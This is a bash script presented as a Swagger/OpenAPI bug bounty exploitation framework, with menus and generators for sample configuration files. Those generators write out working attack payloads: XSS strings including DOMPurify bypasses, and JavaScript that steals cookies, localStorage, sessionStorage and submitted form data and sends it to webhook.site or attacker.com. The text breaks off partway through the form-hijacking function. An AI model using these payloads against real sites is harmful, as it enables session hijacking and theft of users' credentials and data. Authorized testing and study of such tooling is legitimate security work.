#!/bin/bash

# Swagger Bug Bounty Hunter - Professional PoC Tool
# Advanced Swagger/OpenAPI vulnerability discovery and exploitation framework
# Based on kdairatchi/swagger research and methodologies
# Author: Security Researcher
# Version: 4.0 - Enhanced Bug Bounty Edition with Menu System

set -euo pipefail

# Colors and formatting
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m'

# Global configuration
TARGET=""
OUTPUT_DIR=""
THREADS=50
TIMEOUT=15
VERBOSE=false
WORDLIST_MODE=false
SUBDOMAIN_SCAN=false
PARALLEL_SCAN=true
CRAWL4AI_ENABLED=false
PLAYWRIGHT_ENABLED=false
INTERACTIVE_MODE=false
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
PROXY=""
RATE_LIMIT=100
GITHUB_REPO="https://raw.githubusercontent.com/kdairatchi/swagger/main"
MAX_PARALLEL_JOBS=10

# Configuration files
RLOGIN_CONFIG=""
XSSCOOKIE_CONFIG=""
XSSTEST_CONFIG=""
XSSTEST_YAML_CONFIG=""
SCRIPT_JS_CONFIG=""
LOGIN_CONFIG=""
SWAGGER_YAML_CONFIG=""

# Statistics
TOTAL_TARGETS=0
SUBDOMAINS_FOUND=0
SWAGGER_FOUND=0
VULNERABLE_XSS=0
VULNERABLE_ENDPOINTS=0
SENSITIVE_DATA=0
ADDITIONAL_VULNS=0
CRAWLED_PAGES=0

print_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    cat << "EOF"
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                               ║
    ║    ███████╗██╗    ██╗ █████╗  ██████╗  ██████╗ ███████╗██████╗               ║
    ║    ██╔════╝██║    ██║██╔══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗              ║
    ║    ███████╗██║ █╗ ██║███████║██║  ███╗██║  ███╗█████╗  ██████╔╝              ║
    ║    ╚════██║██║███╗██║██╔══██║██║   ██║██║   ██║██╔══╝  ██╔══██╗              ║
    ║    ███████║╚███╔███╔╝██║  ██║╚██████╔╝╚██████╔╝███████╗██║  ██║              ║
    ║    ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝              ║
    ║                                                                               ║
    ║           ██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗           ║
    ║           ██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║           ║
    ║           ██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║           ║
    ║           ██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║           ║
    ║           ██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝           ║
    ║           ╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝            ║
    ║                                                                               ║
    ║           ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗                ║
    ║           ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗               ║
    ║           ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝               ║
    ║           ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗               ║
    ║           ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║               ║
    ║           ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝               ║
    ║                                                                               ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${WHITE}${BOLD}    🎯 Professional Swagger/OpenAPI Bug Bounty Exploitation Framework${NC}"
    echo -e "${CYAN}       Based on kdairatchi/swagger research methodologies${NC}"
    echo -e "${YELLOW}       Designed for responsible security research and bug bounties${NC}"
    echo ""
}

print_status() {
    echo -e "${BLUE}[${WHITE}INFO${BLUE}]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[${WHITE}SUCCESS${GREEN}]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[${WHITE}WARNING${YELLOW}]${NC} $1"
}

print_error() {
    echo -e "${RED}[${WHITE}ERROR${RED}]${NC} $1"
}

print_vuln() {
    echo -e "${RED}[${WHITE}VULNERABLE${RED}]${NC} $1"
}

print_found() {
    echo -e "${GREEN}[${WHITE}FOUND${GREEN}]${NC} $1"
}

print_header() {
    echo ""
    echo -e "${PURPLE}${BOLD}═══ $1 ═══${NC}"
}

# Interactive menu system
show_interactive_menu() {
    clear
    print_banner
    
    echo -e "${CYAN}${BOLD}🎯 SWAGGER BUG BOUNTY HUNTER - INTERACTIVE MODE${NC}"
    echo -e "${WHITE}Choose your scanning mode and configuration:${NC}"
    echo ""
    
    echo -e "${YELLOW}${BOLD}SCANNING ENGINE:${NC}"
    echo -e "  ${GREEN}1)${NC} Playwright (Browser automation, JavaScript rendering)"
    echo -e "  ${GREEN}2)${NC} Crawl4AI (AI-powered content analysis)"
    echo -e "  ${GREEN}3)${NC} Standard HTTP (Fast, lightweight scanning)"
    echo ""
    
    echo -e "${YELLOW}${BOLD}CONFIGURATION FILES:${NC}"
    echo -e "  ${GREEN}4)${NC} Load rlogin.json (Remote login configuration)"
    echo -e "  ${GREEN}5)${NC} Load xsscookie.json (XSS cookie testing)"
    echo -e "  ${GREEN}6)${NC} Load xsstest.json/yaml (XSS test payloads)"
    echo -e "  ${GREEN}7)${NC} Load script.js (Custom JavaScript injection)"
    echo -e "  ${GREEN}8)${NC} Load login.json (Authentication configuration)"
    echo -e "  ${GREEN}9)${NC} Load Swagger.yaml (Custom Swagger specification)"
    echo ""
    
    echo -e "${YELLOW}${BOLD}SCAN OPTIONS:${NC}"
    echo -e "  ${GREEN}10)${NC} Enable subdomain enumeration"
    echo -e "  ${GREEN}11)${NC} Configure proxy settings"
    echo -e "  ${GREEN}12)${NC} Set custom User-Agent"
    echo -e "  ${GREEN}13)${NC} Adjust threading and timeouts"
    echo ""
    
    echo -e "${YELLOW}${BOLD}ACTIONS:${NC}"
    echo -e "  ${GREEN}14)${NC} Start comprehensive scan"
    echo -e "  ${GREEN}15)${NC} Quick vulnerability check"
    echo -e "  ${GREEN}16)${NC} Generate sample configuration files"
    echo -e "  ${GREEN}17)${NC} Exit"
    echo ""
    
    echo -ne "${CYAN}Enter your choice [1-17]: ${NC}"
    read -r choice
    
    case $choice in
        1) configure_playwright ;;
        2) configure_crawl4ai ;;
        3) configure_standard_http ;;
        4) load_rlogin_config ;;
        5) load_xsscookie_config ;;
        6) load_xsstest_config ;;
        7) load_scriptjs_config ;;
        8) load_login_config ;;
        9) load_swagger_yaml_config ;;
        10) configure_subdomain_scan ;;
        11) configure_proxy ;;
        12) configure_user_agent ;;
        13) configure_performance ;;
        14) start_comprehensive_scan ;;
        15) start_quick_scan ;;
        16) generate_sample_configs ;;
        17) exit 0 ;;
        *) 
            print_error "Invalid choice. Please select 1-17."
            sleep 2
            show_interactive_menu
            ;;
    esac
}

# Configuration functions
configure_playwright() {
    print_header "🎭 PLAYWRIGHT CONFIGURATION"
    PLAYWRIGHT_ENABLED=true
    CRAWL4AI_ENABLED=false
    
    echo -e "${GREEN}Playwright mode enabled${NC}"
    echo -e "${YELLOW}Features:${NC}"
    echo "  • Full browser automation with Chromium"
    echo "  • JavaScript execution and DOM manipulation"
    echo "  • Screenshot capture of vulnerabilities"
    echo "  • Advanced XSS payload testing"
    echo ""
    
    echo -ne "${CYAN}Enable headless mode? (Y/n): ${NC}"
    read -r headless
    [[ "$headless" =~ ^[Nn] ]] && export PLAYWRIGHT_HEADLESS=false || export PLAYWRIGHT_HEADLESS=true
    
    echo -ne "${CYAN}Enable slow motion for debugging? (y/N): ${NC}"
    read -r slowmo
    [[ "$slowmo" =~ ^[Yy] ]] && export PLAYWRIGHT_SLOWMO=1000 || export PLAYWRIGHT_SLOWMO=0
    
    print_success "Playwright configured successfully"
    sleep 2
    show_interactive_menu
}

configure_crawl4ai() {
    print_header "🕷️ CRAWL4AI CONFIGURATION"
    CRAWL4AI_ENABLED=true
    PLAYWRIGHT_ENABLED=false
    
    echo -e "${GREEN}Crawl4AI mode enabled${NC}"
    echo -e "${YELLOW}Features:${NC}"
    echo "  • AI-powered content extraction"
    echo "  • Smart vulnerability pattern detection"
    echo "  • Enhanced API endpoint discovery"
    echo "  • Semantic analysis of Swagger documentation"
    echo ""
    
    echo -ne "${CYAN}Enable verbose AI analysis? (Y/n): ${NC}"
    read -r ai_verbose
    [[ "$ai_verbose" =~ ^[Nn] ]] && export CRAWL4AI_VERBOSE=false || export CRAWL4AI_VERBOSE=true
    
    echo -ne "${CYAN}Max pages to analyze (default 10): ${NC}"
    read -r max_pages
    export CRAWL4AI_MAX_PAGES=${max_pages:-10}
    
    print_success "Crawl4AI configured successfully"
    sleep 2
    show_interactive_menu
}

configure_standard_http() {
    print_header "⚡ STANDARD HTTP CONFIGURATION"
    PLAYWRIGHT_ENABLED=false
    CRAWL4AI_ENABLED=false
    
    echo -e "${GREEN}Standard HTTP mode enabled${NC}"
    echo -e "${YELLOW}Features:${NC}"
    echo "  • Fast HTTP-based scanning"
    echo "  • Lightweight resource usage"
    echo "  • High-speed endpoint discovery"
    echo "  • Parallel request processing"
    echo ""
    
    print_success "Standard HTTP configured successfully"
    sleep 2
    show_interactive_menu
}

load_rlogin_config() {
    print_header "🔐 REMOTE LOGIN CONFIGURATION"
    
    echo -ne "${CYAN}Enter path to rlogin.json file: ${NC}"
    read -r config_path
    
    if [[ -f "$config_path" ]]; then
        RLOGIN_CONFIG="$config_path"
        print_success "rlogin.json loaded: $config_path"
        
        # Parse and display config
        if command -v jq >/dev/null 2>&1; then
            echo -e "${YELLOW}Configuration preview:${NC}"
            jq '.' "$config_path" 2>/dev/null || echo "Invalid JSON format"
        fi
    else
        print_error "File not found: $config_path"
        echo -ne "${CYAN}Create sample rlogin.json? (Y/n): ${NC}"
        read -r create_sample
        [[ ! "$create_sample" =~ ^[Nn] ]] && create_sample_rlogin "$config_path"
    fi
    
    echo -ne "${CYAN}Press Enter to continue...${NC}"
    read -r
    show_interactive_menu
}

load_xsscookie_config() {
    print_header "🍪 XSS COOKIE CONFIGURATION"
    
    echo -ne "${CYAN}Enter path to xsscookie.json file: ${NC}"
    read -r config_path
    
    if [[ -f "$config_path" ]]; then
        XSSCOOKIE_CONFIG="$config_path"
        print_success "xsscookie.json loaded: $config_path"
        
        if command -v jq >/dev/null 2>&1; then
            echo -e "${YELLOW}Configuration preview:${NC}"
            jq '.' "$config_path" 2>/dev/null || echo "Invalid JSON format"
        fi
    else
        print_error "File not found: $config_path"
        echo -ne "${CYAN}Create sample xsscookie.json? (Y/n): ${NC}"
        read -r create_sample
        [[ ! "$create_sample" =~ ^[Nn] ]] && create_sample_xsscookie "$config_path"
    fi
    
    echo -ne "${CYAN}Press Enter to continue...${NC}"
    read -r
    show_interactive_menu
}

load_xsstest_config() {
    print_header "🎯 XSS TEST CONFIGURATION"
    
    echo -e "${YELLOW}Choose XSS test format:${NC}"
    echo -e "  ${GREEN}1)${NC} JSON format (xsstest.json)"
    echo -e "  ${GREEN}2)${NC} YAML format (xsstest.yaml)"
    echo ""
    echo -ne "${CYAN}Enter choice [1-2]: ${NC}"
    read -r format_choice
    
    case $format_choice in
        1)
            echo -ne "${CYAN}Enter path to xsstest.json file: ${NC}"
            read -r config_path
            if [[ -f "$config_path" ]]; then
                XSSTEST_CONFIG="$config_path"
                print_success "xsstest.json loaded: $config_path"
            else
                create_sample_xsstest_json "$config_path"
            fi
            ;;
        2)
            echo -ne "${CYAN}Enter path to xsstest.yaml file: ${NC}"
            read -r config_path
            if [[ -f "$config_path" ]]; then
                XSSTEST_YAML_CONFIG="$config_path"
                print_success "xsstest.yaml loaded: $config_path"
            else
                create_sample_xsstest_yaml "$config_path"
            fi
            ;;
        *)
            print_error "Invalid choice"
            ;;
    esac
    
    echo -ne "${CYAN}Press Enter to continue...${NC}"
    read -r
    show_interactive_menu
}

load_scriptjs_config() {
    print_header "📜 CUSTOM JAVASCRIPT CONFIGURATION"
    
    echo -ne "${CYAN}Enter path to script.js file: ${NC}"
    read -r config_path
    
    if [[ -f "$config_path" ]]; then
        SCRIPT_JS_CONFIG="$config_path"
        print_success "script.js loaded: $config_path"
        
        echo -e "${YELLOW}Script preview (first 10 lines):${NC}"
        head -10 "$config_path"
    else
        print_error "File not found: $config_path"
        echo -ne "${CYAN}Create sample script.js? (Y/n): ${NC}"
        read -r create_sample
        [[ ! "$create_sample" =~ ^[Nn] ]] && create_sample_scriptjs "$config_path"
    fi
    
    echo -ne "${CYAN}Press Enter to continue...${NC}"
    read -r
    show_interactive_menu
}

load_login_config() {
    print_header "🔑 LOGIN CONFIGURATION"
    
    echo -ne "${CYAN}Enter path to login.json file: ${NC}"
    read -r config_path
    
    if [[ -f "$config_path" ]]; then
        LOGIN_CONFIG="$config_path"
        print_success "login.json loaded: $config_path"
        
        if command -v jq >/dev/null 2>&1; then
            echo -e "${YELLOW}Configuration preview:${NC}"
            jq '.' "$config_path" 2>/dev/null || echo "Invalid JSON format"
        fi
    else
        print_error "File not found: $config_path"
        echo -ne "${CYAN}Create sample login.json? (Y/n): ${NC}"
        read -r create_sample
        [[ ! "$create_sample" =~ ^[Nn] ]] && create_sample_login "$config_path"
    fi
    
    echo -ne "${CYAN}Press Enter to continue...${NC}"
    read -r
    show_interactive_menu
}

load_swagger_yaml_config() {
    print_header "📋 SWAGGER YAML CONFIGURATION"
    
    echo -ne "${CYAN}Enter path to Swagger.yaml file: ${NC}"
    read -r config_path
    
    if [[ -f "$config_path" ]]; then
        SWAGGER_YAML_CONFIG="$config_path"
        print_success "Swagger.yaml loaded: $config_path"
        
        echo -e "${YELLOW}Swagger specification preview:${NC}"
        head -20 "$config_path"
    else
        print_error "File not found: $config_path"
        echo -ne "${CYAN}Create sample Swagger.yaml? (Y/n): ${NC}"
        read -r create_sample
        [[ ! "$create_sample" =~ ^[Nn] ]] && create_sample_swagger_yaml "$config_path"
    fi
    
    echo -ne "${CYAN}Press Enter to continue...${NC}"
    read -r
    show_interactive_menu
}

configure_subdomain_scan() {
    print_header "🌐 SUBDOMAIN ENUMERATION"
    
    echo -ne "${CYAN}Enable subdomain enumeration? (Y/n): ${NC}"
    read -r enable_subs
    [[ ! "$enable_subs" =~ ^[Nn] ]] && SUBDOMAIN_SCAN=true || SUBDOMAIN_SCAN=false
    
    if [[ "$SUBDOMAIN_SCAN" == true ]]; then
        echo -ne "${CYAN}Max subdomains to scan (default 100): ${NC}"
        read -r max_subs
        export MAX_SUBDOMAINS=${max_subs:-100}
        
        print_success "Subdomain scanning enabled (max: $MAX_SUBDOMAINS)"
    else
        print_status "Subdomain scanning disabled"
    fi
    
    sleep 2
    show_interactive_menu
}

configure_proxy() {
    print_header "🔄 PROXY CONFIGURATION"
    
    echo -ne "${CYAN}Enter proxy URL (e.g., http://127.0.0.1:8080): ${NC}"
    read -r proxy_url
    
    if [[ -n "$proxy_url" ]]; then
        PROXY="$proxy_url"
        print_success "Proxy configured: $proxy_url"
        
        echo -ne "${CYAN}Test proxy connection? (Y/n): ${NC}"
        read -r test_proxy
        if [[ ! "$test_proxy" =~ ^[Nn] ]]; then
            if curl -x "$proxy_url" --connect-timeout 5 -s "http://httpbin.org/ip" >/dev/null 2>&1; then
                print_success "Proxy connection test successful"
            else
                print_warning "Proxy connection test failed"
            fi
        fi
    else
        PROXY=""
        print_status "Proxy disabled"
    fi
    
    sleep 2
    show_interactive_menu
}

configure_user_agent() {
    print_header "🕵️ USER-AGENT CONFIGURATION"
    
    echo -e "${YELLOW}Predefined User-Agents:${NC}"
    echo -e "  ${GREEN}1)${NC} Chrome (default)"
    echo -e "  ${GREEN}2)${NC} Firefox"
    echo -e "  ${GREEN}3)${NC} Safari"
    echo -e "  ${GREEN}4)${NC} Mobile Chrome"
    echo -e "  ${GREEN}5)${NC} Googlebot"
    echo -e "  ${GREEN}6)${NC} Custom"
    echo ""
    
    echo -ne "${CYAN}Choose User-Agent [1-6]: ${NC}"
    read -r ua_choice
    
    case $ua_choice in
        1) USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" ;;
        2) USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" ;;
        3) USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15" ;;
        4) USER_AGENT="Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1" ;;
        5) USER_AGENT="Googlebot/2.1 (+http://www.google.com/bot.html)" ;;
        6)
            echo -ne "${CYAN}Enter custom User-Agent: ${NC}"
            read -r custom_ua
            USER_AGENT="$custom_ua"
            ;;
        *) print_error "Invalid choice, keeping default" ;;
    esac
    
    print_success "User-Agent configured"
    sleep 2
    show_interactive_menu
}

configure_performance() {
    print_header "⚡ PERFORMANCE CONFIGURATION"
    
    echo -ne "${CYAN}Number of threads (current: $THREADS): ${NC}"
    read -r new_threads
    [[ -n "$new_threads" ]] && THREADS="$new_threads"
    
    echo -ne "${CYAN}Request timeout in seconds (current: $TIMEOUT): ${NC}"
    read -r new_timeout
    [[ -n "$new_timeout" ]] && TIMEOUT="$new_timeout"
    
    echo -ne "${CYAN}Rate limit (requests/second, current: $RATE_LIMIT): ${NC}"
    read -r new_rate
    [[ -n "$new_rate" ]] && RATE_LIMIT="$new_rate"
    
    echo -ne "${CYAN}Max parallel jobs (current: $MAX_PARALLEL_JOBS): ${NC}"
    read -r new_jobs
    [[ -n "$new_jobs" ]] && MAX_PARALLEL_JOBS="$new_jobs"
    
    print_success "Performance settings updated"
    sleep 2
    show_interactive_menu
}

start_comprehensive_scan() {
    print_header "🚀 STARTING COMPREHENSIVE SCAN"
    
    echo -ne "${CYAN}Enter target URL: ${NC}"
    read -r target_url
    
    if [[ -z "$target_url" ]]; then
        print_error "Target URL is required"
        sleep 2
        show_interactive_menu
        return
    fi
    
    TARGET="$target_url"
    OUTPUT_DIR="swagger_comprehensive_$(date +%Y%m%d_%H%M%S)"
    
    print_status "Target: $TARGET"
    print_status "Output: $OUTPUT_DIR"
    print_status "Engine: $(get_scan_engine)"
    
    echo -ne "${CYAN}Proceed with scan? (Y/n): ${NC}"
    read -r proceed
    [[ "$proceed" =~ ^[Nn] ]] && { show_interactive_menu; return; }
    
    INTERACTIVE_MODE=false
    main_scan_logic
}

start_quick_scan() {
    print_header "⚡ STARTING QUICK VULNERABILITY CHECK"
    
    echo -ne "${CYAN}Enter target URL: ${NC}"
    read -r target_url
    
    if [[ -z "$target_url" ]]; then
        print_error "Target URL is required"
        sleep 2
        show_interactive_menu
        return
    fi
    
    TARGET="$target_url"
    OUTPUT_DIR="swagger_quick_$(date +%Y%m%d_%H%M%S)"
    
    # Quick scan settings
    SUBDOMAIN_SCAN=false
    CRAWL4AI_ENABLED=false
    PLAYWRIGHT_ENABLED=false
    MAX_PARALLEL_JOBS=5
    
    print_status "Starting quick vulnerability check..."
    INTERACTIVE_MODE=false
    main_scan_logic
}

get_scan_engine() {
    if [[ "$PLAYWRIGHT_ENABLED" == true ]]; then
        echo "Playwright (Browser Automation)"
    elif [[ "$CRAWL4AI_ENABLED" == true ]]; then
        echo "Crawl4AI (AI Analysis)"
    else
        echo "Standard HTTP"
    fi
}

# Sample configuration file generators
generate_sample_configs() {
    print_header "📄 GENERATING SAMPLE CONFIGURATION FILES"
    
    local config_dir="./swagger_configs_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$config_dir"
    
    echo -e "${YELLOW}Creating sample configuration files in: $config_dir${NC}"
    echo ""
    
    # Generate all sample files
    create_sample_rlogin "$config_dir/rlogin.json"
    create_sample_xsscookie "$config_dir/xsscookie.json"
    create_sample_xsstest_json "$config_dir/xsstest.json"
    create_sample_xsstest_yaml "$config_dir/xsstest.yaml"
    create_sample_scriptjs "$config_dir/script.js"
    create_sample_login "$config_dir/login.json"
    create_sample_swagger_yaml "$config_dir/Swagger.yaml"
    
    print_success "All sample configuration files generated in: $config_dir"
    
    echo -e "${CYAN}Files created:${NC}"
    ls -la "$config_dir/"
    
    echo -ne "${CYAN}Press Enter to continue...${NC}"
    read -r
    show_interactive_menu
}

create_sample_rlogin() {
    local file_path="$1"
    
    cat > "$file_path" << 'EOF'
{
  "description": "Remote login configuration for authenticated Swagger scanning",
  "version": "1.0",
  "login_methods": {
    "basic_auth": {
      "enabled": true,
      "username": "admin",
      "password": "password123",
      "realm": "Swagger API"
    },
    "bearer_token": {
      "enabled": false,
      "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
      "header_name": "Authorization",
      "prefix": "Bearer "
    },
    "api_key": {
      "enabled": false,
      "key": "your-api-key-here",
      "header_name": "X-API-Key",
      "query_param": "api_key"
    },
    "oauth2": {
      "enabled": false,
      "client_id": "your-client-id",
      "client_secret": "your-client-secret",
      "token_url": "https://api.example.com/oauth/token",
      "scope": "read write"
    },
    "session_cookie": {
      "enabled": false,
      "login_url": "https://api.example.com/login",
      "username_field": "username",
      "password_field": "password",
      "session_cookie_name": "JSESSIONID"
    }
  },
  "endpoints": {
    "protected_swagger": [
      "/api/swagger-ui/",
      "/docs/",
      "/admin/api-docs"
    ]
  },
  "headers": {
    "User-Agent": "SwaggerBugBountyHunter/4.0",
    "Accept": "application/json,text/html",
    "X-Forwarded-For": "127.0.0.1"
  },
  "timeouts": {
    "login_timeout": 30,
    "request_timeout": 15
  }
}
EOF
    
    print_success "Created rlogin.json: $file_path"
}

create_sample_xsscookie() {
    local file_path="$1"
    
    cat > "$file_path" << 'EOF'
{
  "description": "XSS cookie testing configuration for Swagger UI exploitation",
  "version": "1.0",
  "cookie_payloads": {
    "session_hijacking": [
      {
        "name": "Basic Cookie Theft",
        "payload": "document.location='https://webhook.site/unique-id?cookie='+document.cookie",
        "delivery_method": "swagger_url_param"
      },
      {
        "name": "Advanced Cookie Exfiltration",
        "payload": "fetch('https://attacker.com/log',{method:'POST',body:JSON.stringify({cookies:document.cookie,url:location.href,timestamp:Date.now()})})",
        "delivery_method": "swagger_title_injection"
      }
    ],
    "session_persistence": [
      {
        "name": "LocalStorage Theft",
        "payload": "var data={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);data[k]=localStorage.getItem(k)}fetch('https://webhook.site/unique-id',{method:'POST',body:JSON.stringify(data)})",
        "delivery_method": "swagger_description"
      },
      {
        "name": "SessionStorage Theft",
        "payload": "var data={};for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);data[k]=sessionStorage.getItem(k)}fetch('https://webhook.site/unique-id',{method:'POST',body:JSON.stringify(data)})",
        "delivery_method": "swagger_version"
      }
    ]
  },
  "target_cookies": [
    "JSESSIONID",
    "session",
    "auth_token",
    "jwt",
    "csrf_token",
    "user_id",
    "admin_session"
  ],
  "webhook_urls": [
    "https://webhook.site/your-unique-id",
    "https://requestbin.com/your-bin",
    "https://attacker-controlled-domain.com/log"
  ],
  "testing_options": {
    "encode_payloads": true,
    "test_all_parameters": true,
    "follow_redirects": false,
    "capture_screenshots": true
  }
}
EOF
    
    print_success "Created xsscookie.json: $file_path"
}

create_sample_xsstest_json() {
    local file_path="$1"
    
    cat > "$file_path" << 'EOF'
{
  "description": "Comprehensive XSS testing payloads for Swagger UI vulnerabilities",
  "version": "1.0",
  "payloads": {
    "basic_xss": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "javascript:alert('XSS')",
      "<iframe src=javascript:alert('XSS')>"
    ],
    "advanced_xss": [
      "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><noscript><a title=\"</noscript><img src=x onerror=alert('XSS-ADVANCED')>",
      "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title=\"</style><img src=x onerror=alert('XSS-STYLE')>",
      "<svg><animate onbegin=alert('XSS-SVG')>",
      "<details open ontoggle=alert('XSS-DETAILS')>"
    ],
    "dom_purify_bypasses": [
      "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert('XSS-DOMPURIFY')>",
      "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=x onerror=alert('XSS-BYPASS')>\">",
      "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS-NOSCRIPT')>\">"
    ],
    "swagger_specific": [
      "{\"swagger\":\"2.0\",\"info\":{\"title\":\"<script>alert('XSS-SWAGGER')</script>\",\"version\":\"1.0\"}}",
      "{\"openapi\":\"3.0.0\",\"info\":{\"title\":\"<img src=x onerror=alert('XSS-OPENAPI')>\",\"version\":\"1.0\"}}",
      "{\"swagger\":\"2.0\",\"info\":{\"description\":\"<svg onload=alert('XSS-DESC')>\",\"version\":\"1.0\"}}"
    ],
    "encoded_payloads": [
      "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
      "%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
      "&#x3C;script&#x3E;alert(&#x27;XSS&#x27;)&#x3C;/script&#x3E;"
    ]
  },
  "injection_points": [
    "swagger_url_parameter",
    "swagger_title",
    "swagger_description",
    "swagger_version",
    "api_endpoint_path",
    "parameter_name",
    "parameter_description",
    "response_example"
  ],
  "testing_methods": {
    "direct_injection": true,
    "parameter_pollution": true,
    "header_injection": true,
    "cookie_injection": true,
    "referer_injection": true
  }
}
EOF
    
    print_success "Created xsstest.json: $file_path"
}

create_sample_xsstest_yaml() {
    local file_path="$1"
    
    cat > "$file_path" << 'EOF'
description: "XSS testing configuration in YAML format for Swagger vulnerability assessment"
version: "1.0"

payloads:
  basic:
    - "<script>alert('XSS')</script>"
    - "<img src=x onerror=alert('XSS')>"
    - "<svg onload=alert('XSS')>"
    - "javascript:alert('XSS')"
    - "<iframe src=javascript:alert('XSS')>"
  
  advanced:
    - "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><noscript><a title=\"</noscript><img src=x onerror=alert('XSS-ADVANCED')>"
    - "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title=\"</style><img src=x onerror=alert('XSS-STYLE')>"
    - "<svg><animate onbegin=alert('XSS-SVG')>"
    - "<details open ontoggle=alert('XSS-DETAILS')>"
  
  swagger_json:
    - '{"swagger":"2.0","info":{"title":"<script>alert(\"XSS-SWAGGER\")</script>","version":"1.0"}}'
    - '{"openapi":"3.0.0","info":{"title":"<img src=x onerror=alert(\"XSS-OPENAPI\")>","version":"1.0"}}'
    - '{"swagger":"2.0","info":{"description":"<svg onload=alert(\"XSS-DESC\")>","version":"1.0"}}'

injection_vectors:
  url_params:
    - "url"
    - "configUrl"
    - "spec"
    - "definition"
  
  headers:
    - "X-Forwarded-Host"
    - "Host"
    - "Referer"
    - "User-Agent"
  
  swagger_fields:
    - "title"
    - "description"
    - "version"
    - "contact.name"
    - "license.name"

testing_config:
  timeout: 15
  retries: 3
  screenshot_on_success: true
  follow_redirects: false
  verify_ssl: false
  
exploitation:
  cookie_theft:
    webhook: "https://webhook.site/unique-id"
    method: "GET"
  
  session_hijack:
    target_cookies:
      - "JSESSIONID"
      - "session"
      - "auth_token"
  
  persistence:
    storage_theft: true
    form_hijacking: true
    keylogging: false
EOF
    
    print_success "Created xsstest.yaml: $file_path"
}

create_sample_scriptjs() {
    local file_path="$1"
    
    cat > "$file_path" << 'EOF'
/**
 * Custom JavaScript injection script for Swagger UI exploitation
 * Swagger Bug Bounty Hunter v4.0
 * Use for authorized security testing only
 */

// Cookie theft function
function stealCookies() {
    const cookies = document.cookie;
    const webhookUrl = 'https://webhook.site/your-unique-id';
    
    if (cookies) {
        fetch(webhookUrl + '?cookies=' + encodeURIComponent(cookies), {
            method: 'GET',
            mode: 'no-cors'
        }).catch(() => {
            // Fallback: image-based exfiltration
            const img = new Image();
            img.src = webhookUrl + '?cookies=' + encodeURIComponent(cookies);
        });
    }
}

// Local storage theft
function stealLocalStorage() {
    const data = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data[key] = localStorage.getItem(key);
    }
    
    if (Object.keys(data).length > 0) {
        fetch('https://webhook.site/your-unique-id', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                type: 'localStorage',
                data: data,
                url: location.href,
                timestamp: Date.now()
            })
        });
    }
}

// Session storage theft
function stealSessionStorage() {
    const data = {};
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        data[key] = sessionStorage.getItem(key);
    }
    
    if (Object.keys(data).length > 0) {
        fetch('https://webhook.site/your-unique-id', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                type: 'sessionStorage',
                data: data,
                url: location.href,
                timestamp: Date.now()
            })
        });
    }
}

// Form hijacking
function hijackForms() {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        form.addEventListener('submit', function(e) {
            const formData = new FormData(form);
            const data = {};
            formData.forEach((value, key) => {
                data[key] = value;
            });
            
            fetch('https://webhook.site/your-unique-id', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    type: 'formData',
                    data: data,
